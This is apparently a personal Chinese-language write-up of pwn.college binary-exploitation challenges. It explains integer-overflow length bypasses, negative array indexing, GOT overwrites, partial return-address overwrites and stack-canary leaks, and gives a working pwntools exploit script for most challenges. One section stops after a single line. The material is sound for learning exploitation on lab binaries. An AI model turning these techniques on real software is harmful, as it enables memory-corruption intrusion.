## Casting Catastrophy

类似上一题，但是输入长度变成了输入两个数，长度为两个数相乘，最后要求乘出来的长度不能超过 25。

检查用的乘法和实际用的乘法不一样：

```asm
; 检查：32 位乘法 + 无符号比较
402326: imul  eax, edx        ; eax = (record_num * record_size) 只保留低 32 位
402329: cmp   eax, 0x19
40232c: jbe   40234d          ; 无符号 <= 25 才放过   ← 上一问的 jbe
        → 否则 assert_fail("record_size * record_num <= 25")

; 使用：64 位乘法
40234d: mov  eax, [rbp-0x34]   ; eax = record_num
402350: mov  eax, eax          ; 零扩展 → rax = (uint64)record_num
402352: mov  [rbp-0x10], rax   ; total = rax          ← 先存起来
402356: mov  eax, [rbp-0x38]   ; eax = record_size    ← eax 被复用了！
402359: mov  edx, eax          ; 零扩展 → rdx = (uint64)record_size
40235b: mov  rax, [rbp-0x10]   ; rax = total          ← 把 record_num 读回来
40235f: imul rax, rdx          ; rax = record_num × record_size
402363: mov  [rbp-0x10], rax   ; total = 结果
```

我们直接两个数字都输入 `65536`，那么 `0x10000 * 0x10000 = 0x100000000`，32 位截断就变成 `0` 了。

```python
from pwnstart import *

io = start()
io.recvuntil(b"to send: ")
io.send(b"65536\n65536\n")
io.recvrepeat(0.3)
payload = b'A' * 56 + p64(0x401edc)
io.send(payload)
print(io.recvall(timeout=2).decode(errors="replace"))
io.shutdown()
```

## Point Problem (Hard)

题目不泄露 `Flag` 地址了。注意到：

```asm
1e31:           lea    rax,[rip+0x337e]        # 51b6 <bssdata+0x176>
1e38:           mov    QWORD PTR [rbp-0x18],rax

# 最后的 printf

1f60:           mov    rax,QWORD PTR [rbp-0x18]
1f64:           mov    rsi,rax
1f67:           lea    rdi,[rip+0x11ba]        # 3128 <_IO_stdin_used+0x128> # ?
1f6e:           mov    eax,0x0
1f73:           call   1110 <printf@plt>

printf("The string on the stack is: %s\n", p);
//     └─ rdi ─────────────────────┘  └─ rsi ─┘

```
_? : `printf()` 的格式化 汇编之后感觉也挺神秘的..._

我们可以做 **Partial Overwrite**，把 `bssdata+0x176` 改成 `bssdata+0`，也就是 `Flag` 开始的地方：

```asm
1eb5:           call   1140 <open@plt>
1eba:           mov    edx,0x100
1ebf:           lea    rsi,[rip+0x317a]        # 5040 <bssdata>
1ec6:           mov    edi,eax
1ec8:           call   1120 <read@plt>

# read 把 open 的内容读到 bssdata+0 了
```

也就是说，我们要从 `buf` 的开始 `[rbp-0x50]` 写到 `[rbp-0x18]` 处 QWORD 的低 12 位，把 `0x1b6` 改成 `0x040`。

```python
from pwnstart import *

while True:
    io = start()
    io.recvuntil(b"Payload size: ")
    io.send(b"58\n")
    io.recvrepeat(0.3)
    payload = b'A' * 0x38 + p16((1 << 12) | 0x40) # 0xi040
    io.send(payload)
    out = io.recvrepeat(0.3)
    if b"pwn.college" in out:
        get_flag(out, prefix="pwn.college")
        break
    io.close()
    print()
```

不要把 `(1 << 12)` 写成 `(1 << 4)` 哦！不然你就会像这天下午的 WooYun 一样，他看着 exp 跑了 10 分钟以为自己运气居然如此之差（好），怎么还没有把 `Flag` 抽出来。

## Anomalous Array

题目提示我们，栈上有一个数组的妙妙小数字。输入一个 `index`，他会输出那个位置的数字。

反汇编可以得知，题目把 `Flag` 也读到了栈里：

```asm
1a30:              lea    rax,[rbp-0x910]
1a37:              mov    QWORD PTR [rbp-0x10],rax
...
1b98:              mov    esi,0x0
1b9d:              lea    rdi,[rip+0x89f]        # 2443 <_IO_stdin_used+0x443>
1ba4:              mov    eax,0x0
1ba9:              call   1100 <open@plt>
1bae:              mov    ecx,eax
1bb0:              mov    rax,QWORD PTR [rbp-0x10]
1bb4:              mov    edx,0x100
1bb9:              mov    rsi,rax
1bbc:              mov    edi,ecx
1bbe:              call   10e0 <read@plt>
```

顺便去学习了一下怎么确定这里 `read` 的就是 `/flag`

1) 可以查 `.rodata`
```bash
objdump -s -j .rodata ./bin
```

2) 用 `strings`
```bash
strings -t x ./bin | grep -w flag
```

`-t x` 要求输出文件偏移，`-w` 要求整词匹配。

3) `strace` 可以看到所有系统调用

4) 用 GDB
```gdb
b *challenge+0x1b98        # 或 b open
run
x/s $rdi                   # → "/flag"
info registers esi edi     # esi=0 (O_RDONLY)
```

回到正题。

然后我们发现我们可以输入为负的 `index`，因为：

1) `sacnf` 的参数是 `%d`:
```asm
1d66:              lea    rax,[rbp-0x964]
1d6d:              mov    rsi,rax
1d70:              lea    rdi,[rip+0x89f]        # 2616 <_IO_stdin_used+0x616>
1d77:              mov    eax,0x0
1d7c:              call   1110 <__isoc99_scanf@plt>
```

```.rodata
2610 6965773f 20002564 00000000 00000000  iew? .%d.......
```
而不是 `%u`。

2) 有 `cdqe`:
```asm
1daa: mov  eax,[rbp-0x964]       ; eax = index（int，32 位）
1db0: cdqe                       ; ← 符号扩展到 64 位
1db2: add  rax,0xd6
1db8: mov  rax,[rbp+rax*8-0x910] ; 拿 index 算地址
```

那么 `cdqe` 是什么呢...

> cdqe = Convert Doubleword to Quadword, Extend，把 32 位 EAX 按符号扩展到 64 位 RAX。

具体是把 EAX 的最高位（bit 31）复制填满 RAX 的高 32 位：

```
EAX = 0x00000005  →  RAX = 0x00000000_00000005   （正数，补 0）
EAX = 0xFFFFFFFE  →  RAX = 0xFFFFFFFF_FFFFFFFE   （-2，补 1）
```

等价于 `movsxd rax, eax`。

如果是直接零拓展 `mov eax, eax`，输入负索引，算出来的位置就起飞了。

不过其实 pwn.college 的作者都是应该写完 C 代码然后让编译器来写的这些？理论上都会有 `cdqe` 才是正常的...这一切也许没有意义...只是我在弱小地读神秘的寄存来寄存去的汇编而已...

总之，这样我们就可以通过输入一个神秘的负数下标直接让程序输出 `Flag` 了。

依旧 C 不管你数组下标有没有超出去这一块。主不在乎。

计算一下。先找一下 `index = 0` 在哪里：

```asm
1b25:              lea    rax,[rbp-0x910]
1b2c:              add    rax,0x6b0
1b32:              mov    rsi,rax
1b35:              lea    rdi,[rip+0x724]        # 2260 <_IO_stdin_used+0x260>
1b3c:              mov    eax,0x0
1b41:              call   10d0 <printf@plt>
```

总之这里是题目打印数组起点的地方：`"The array starts at %p"`。也就是数组是从 `[rbp-0x260]` 开始的。

> Hard 版里面没有打印数组起点。你也可以按寻址的那个 `lea`，把 `index=0` 带进去算。也可以算出来。

然后一开始说 `Flag` 被读到 `[rbp-0x910]`。

也就是说:

```
高地址
rbp-0x258:      a[1]
rbp-0x260:      a[0]
...
rbp-0x???       flag 的结束
...
rbp-0x910:      flag 的开始
低地址
```

`(0x910 - 0x260) / 8 = 214`。我们试一下 `a[-214]`：

`Your hacker number is 6c6c6f632e6e7770`

然后看 `p64(0x6c6c6f632e6e7770)` 是 `b'pwn.coll'`

当然题目是随机的，不一定会是 `-214`。

理论上就可以手动或者写自动化了。

```python
from pwnstart import *
import re

flag=b""

for i in range(10):
    io = start()
    io.recvuntil(b"Which number would you like to view?")

    io.send(f"{-214 + i}\n".encode())
    out = io.recvrepeat(0.5)

    m = re.search(rb"Your hacker number is ([0-9a-f]+)", out)

    value = int(m.group(1), 16)

    # flag += value.to_bytes(8, "little")

    flag += p64(value)

    io.close()

    print(flag.decode().split('\n')[0]) # 发现 flag 段后面有一个 \n。你当然完全可以直接 print(flag) 直接复制那一段的。
```

## Now you get it (Easy)

这题涉及了 `.bss` `got` `.plt` 这些。

| 东西 | 是什么 | 可写吗 |
| --- | --- | --- |
| .bss | 未初始化的全局变量区，加载时由内核给全零页 | ✓    |
| .got | 全局变量（如 stdout）的运行时地址 | RELRO 后只读 |
| .got.plt | 外部函数的运行时地址表 | Partial RELRO 下可写 |
| .plt | 每个外部函数的跳板代码（jmp [xxx@got]） | ✗ |

题目做了这些事情：

1) 在 `bss` 里面造一个数组

2) 泄露了 数组起点、GOT、`win` 函数的地址

3) 让我们输入一个 `index`，输出 `a[index]`

4) 让我们输入一个新的数来覆盖 `a[index]`

5) 之后还调用了一个 `putchar('\n')`。

我们要做的就是把 `putchar@got` 写成 `win` 的地址。

可以在 `objdump` 里面查到：

```
putchar@got             = 0x5018
_GLOBAL_OFFSET_TABLE_   = 0x5000
────────────────────────────────
差                      = 0x0018
```

```python
from pwnstart import *
import re

io = start()
buf = io.recvuntil(b"view? ")

arr = int(re.search(rb"array starts at (0x[0-9a-f]+)", buf).group(1), 16)
got = int(re.search(rb"GOT \(global offset table\) is located at\s+(0x[0-9a-f]+)", buf).group(1), 16)
win = int(re.search(rb"win is located at: (0x[0-9a-f]+)", buf).group(1), 16)

idx = (got + 0x18 - arr) // 8

io.send(f"{idx}\n".encode())    # 第一次 scanf: %d
io.recvrepeat(0.5)
io.send(f"{win}\n".encode())    # 第二次 scanf: %lld
print(io.recvrepeat(1.0).decode(errors="replace"))
```

## Now you get it (Hard)

只泄露了 `win` 地址。还有一些其它变动，比如说最后 `putchar` 要改成用 `puts`。

> 愚蠢的 w00 第一次选择了永远不会被调用的 `__stack_chk_fail`... 这家伙在写什么呢...

`got` 和 `arr` 需要借助泄露出来的 `win` 来推算。

然而用 `puts` 有一个问题：`win` 里面也有 `puts`，而且是在输出 `Flag` 之前就有，这样就永远达不到了。

我们直接跳到第一个 `puts` 之后就行。当然，后面还有 `puts`，还是会一直递归。

但是谁不想看到 `Flag` 如潮水般涌来呢！

```python
from pwnstart import *
import re

io = start()
buf = io.recvuntil(b"view? ")

win = int(re.search(rb"win is located at: (0x[0-9a-f]+)", buf).group(1), 16)
base = win - 0x1e84
got = base + 0x5000
arr = base + 0x17a * 8 +0x5200

idx = (got + 0x20 - arr) // 8

io.send(f"{idx}\n".encode())    # 第一次 scanf: %d
io.recvrepeat(0.5)
io.send(f"{win + 0x1e98 - 0x1e84}\n".encode())    # 第二次 scanf: %lld
flag = io.recvuntil(b"}")
io.close()
print(flag.decode())
```

## Loop Lunacy (Eazy)

这道题挺综合的。

本题先让你输入 Payload 长度，然后开始读。

特点在于，本题的读入是一个字节一个字节进行的：

```c
while (n < size) {
    n += read(0, input + n, 1);
}
```

题目表示：这是让你用来跳过 Canary 的。

```
    相对 rbp      相对 buffer                  内容
高 ─────────────────────────────────────────────────────────────
    [rbp+0x08]        +88   ←── 返回地址 = main+0x13 (0x2054)
    [rbp+0x00]        +80   ←── saved rbp
    [rbp-0x08]        +72   ←── canary（8 字节）      
    [rbp-0x18]        +56   ←── int n（4 字节）      
    [rbp-0x50]         +0   ←── buffer[53]
低 ─────────────────────────────────────────────────────────────
```

由于神秘 C 大人依然不检查数组有没有越界，我们可以写着写着把 `n` 修改了，让下一轮循环直接跳到返回地址那里；

然后再做 Partial Overwrite 即可。

```python
from pwnstart import *

def pwn_once():
    io = start()
    try:
        io.sendlineafter(b"Payload size: ", b"90")
        io.recvuntil(b"Send your payload")
        io.send(b"A" * 56 + bytes([88 - 1, 0x40, 0x15]))

        # 在 win_auth 里面跳过 1337 检查的位置是 0x?540。不妨设 ?=1。

        # 注意 88 要减 1，因为 read 完 n 就加上 read 返回的 1 了。

        io.recvuntil(b"pwn.college{", timeout=3)
        return (b"pwn.college{" + io.recvuntil(b"}", timeout=2)).decode()
    except Exception:
        return None
    finally:
        io.close()

while True:
    flag = pwn_once()
    if flag:
        break
    
print(flag)
```

> 我去，怎么一把出了。运运。

Hard 版的栈帧居然是一样的，只要改一下 Partial Overwrite 的东西就可以了。神秘。

## Noisy Neighbour

`Flag` 被程序读到栈上，`buf[]` 刚好连着 `Flag`，

1722:           add    rax,0x5c

## Recursive Ruin (Easy)

和 Loop Lunacy 类似，Canary 卡在返回地址和 `buf` 起点之间。

但这题并不是一个一个字节读，而是在 `challenge()` 的结尾藏了一个后门：在 Payload 里如果找到 `"REPEAT"` 字段，就会再调用一次 `challenge()`。

```c
if (!strstr(v3, "REPEAT"))
{
    puts("Goodbye!");
    return 0;
}
puts("Backdoor triggered! Repeating challenge()");
return challenge(a0, a1, a2);
```

```
You said: REPEAT
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
Backdoor triggered! Repeating challenge()
The challenge() function has just been launched!
```

而这个时候题目已经把 Canary 泄露出来了。

```
The program's memory status:
- the input buffer starts at 0x7ffdb579dc80
- the saved frame pointer (of main) is at 0x7ffdb579dd10
- the saved return address (previously to main) is at 0x7ffdb579dd18
- the saved return address is now pointing to 0x5e45a03c46e5.
- the canary is stored at 0x7ffdb579dd08.
- the canary value is now 0xa7ed2622b4982900.
- the address of win_authed() is 0x5e45a03c3c7d.
```

然后就是算地址算地址和算地址...

```python
from pwnstart import *
import re

CANARY_OFF = 136
RET_MAIN   = 0x26e5
WIN_SKIP   = 0x1c99

io = start()

# 帧 1：只发 REPEAT -> 泄漏 canary/返回地址 + 触发递归
io.sendlineafter(b"Payload size: ", b"6")
io.recvuntil(b"Send your payload")
io.send(b"REPEAT")
leak = io.recvuntil(b"Payload size: ", timeout=5)

canary = int(re.search(rb"canary value is now (0x[0-9a-f]+)", leak).group(1), 16)
ret    = int(re.search(rb"return address is now pointing to (0x[0-9a-f]+)", leak).group(1), 16)
target = (ret - RET_MAIN) + WIN_SKIP

# 帧 2：canary 填真值，返回地址只改低 2 字节
io.sendline(str(CANARY_OFF + 8 + 8 + 2).encode())
io.recvuntil(b"Send your payload")
io.send(b"A" * CANARY_OFF + p64(canary) + b"B" * 8 + p16(target & 0xFFFF))

io.recvuntil(b"pwn.college{", timeout=3)
flag = b"pwn.college{" + io.recvuntil(b"}", timeout=2)
io.close()
print(flag.decode())
```

## Recursive Ruin (Hard)

这次不直接泄露 Canary 了。

但是 `You said` 这个 `printf("%s)` 还在。

由于 Canary 的最低字节固定是 `\x00`，`printf("%s)` 本会在这里停止。我们可以通过先把这个最低字节覆盖成不是 `\x00`，就可以借助 `You said` 来泄露 Canary 了。

甚至我们还可以再把 saved rbp 也覆盖了，再把返回地址也泄露出来。

```python
from pwnstart import *

CANARY_OFF = 136
RET_PARENT = 0x2484      # call challenge 的下一条（帧 2 的返回地址，用来算 base）
WIN_SKIP   = 0x21b0      # win_authed 里 jne 之后

def parse_said(out):
    i = out.find(b"You said: ")
    return out[i+10:out.find(b"\n", i)]

io = start()

# 帧 1：打掉 canary[0] 的 0x00 -> 泄漏 canary[1..7]
io.sendlineafter(b"Payload size: ", b"137")
io.recvuntil(b"Send your payload")
payload1 = b"REPEAT" + b"A" * 130 + b"\x41"
io.send(payload1)
said1 = parse_said(io.recvuntil(b"Backdoor", timeout=3))
canary = u64(b"\x00" + said1[137:144])
cbytes = p64(canary)

# 帧 2：填回 canary + 打过 saved rbp 的 0x00 -> 泄漏返回地址
io.sendline(b"152")
io.recvuntil(b"Send your payload")
payload2 = b"REPEAT" + b"A" * 130 + b"\x41" + cbytes[1:8] + b"\x41" * 8
io.send(payload2)
log.info("%s", payload2)
said2 = parse_said(io.recvuntil(b"Backdoor", timeout=3))

base = u64(said2[152:158] + b"\x00\x00") - RET_PARENT
log.info("base = %#x", base)

# 帧 3：canary 填真值 + 覆盖返回地址低 2 字节
io.sendline(b"154")
io.recvuntil(b"Send your payload")
payload3 = b"A" * CANARY_OFF + cbytes + b"B" * 8 + p16((base + WIN_SKIP) & 0xFFFF)
io.send(payload3)
log.info("%s", payload3)

io.recvuntil(b"pwn.college{", timeout=3)
flag = b"pwn.college{" + io.recvuntil(b"}", timeout=2)
io.close()
print(flag.decode())
```

## Lingering Leftover

题目一上来就说：
```
This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?
```

反编译之后得知程序在 `main()` 的一开始就调用了一个 `verify_flag()` 函数，把 `Flag` 读到了栈上（`[rbp-0x108]`）。然后没有擦除就退出调用了。

由于 `verify_flag()` 和 `challenge()` 都是 `main()` 调用的，他们的 `rbp` 是一样的。而 `challenge()` 里 `buf` 的开始位置是 `[rbp-0x180]`

我们输入 `b'A' * (0x180-0x108)`，把输入和残留的 `Flag` 连起来，接着借用 `You said` 来拿到 `Flag` 就行了。

## Latent Leak (Hard)

果然一开始和递归纠缠就很烧脑...人脑究竟是什么数据结构的？

这题也是在 Payload 里面如果有 `"REPEAT"` 就会递归调用 `challenge`，也是开了 `Canary` 和 `PIE`。

但是这次不能用 `You said` 来泄露 Canary，因为 `You said` 被限制了输出的长度：

```python
from pwnstart import *

def pwn_once():
    io = start()
    io.sendlineafter(b"Payload size: ", b"6")
    io.sendafter(b"Send your payload", b"REPEAT")

    payload1 = b"REPEAT" + (-6 + 0x200 - 0x118 + 1) * b'A'
    log.info(str(len(payload1)).encode())

    io.sendlineafter(b"Payload size: ", str(len(payload1)).encode())
    io.sendafter(b"Send your payload", payload1)

    io.recvuntil(b"You said: ")
    io.recvn(len(payload1))
    canary = u64(b"\x00" + io.recvn(7))
    log.success("canary = %#x", canary)

    payload2 = (0x200 - 0x8) * b'A' + p64(canary) + 0x8 * b'A' + b"\x40\x1c"
    io.sendlineafter(b"Payload size: ", str(len(payload2)).encode())
    io.sendafter(b"Send your payload", payload2)

    try:
        io.recvuntil(b"pwn.college{", timeout=3)
        return (b"pwn.college{" + io.recvuntil(b"}", timeout=2)).decode()
    except Exception:
        return None
    finally:
        io.close()

while True:
    flag = pwn_once()
    if flag is not None:
        print(flag)
        break    
```

注意到由于 `main()` 的结构是 `printf("Welcome! ...)`，然后 `call challenge`，这在结构上和 `challenge` 递归调用 `challenge` 有相似性。实际上可以直接把 exp 里面第一次只输入 `REPEAT` 的那一次给去掉，也就是 `io = start()` 后面那两行。而且其它数字都不用改。
